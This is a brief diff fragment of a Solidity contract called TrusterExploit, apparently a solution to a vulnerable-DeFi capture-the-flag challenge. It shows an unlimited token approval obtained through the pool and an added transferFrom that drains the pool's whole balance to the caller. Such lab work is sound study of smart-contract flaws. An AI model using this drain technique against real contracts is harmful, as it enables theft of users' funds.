@@ -47,3 +47,6 @@ contract TrusterExploit {
         IERC20 token = IERC20(_token);
             "approve(address, uint256)", address(this), int(-1)
 
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
+    }
+}
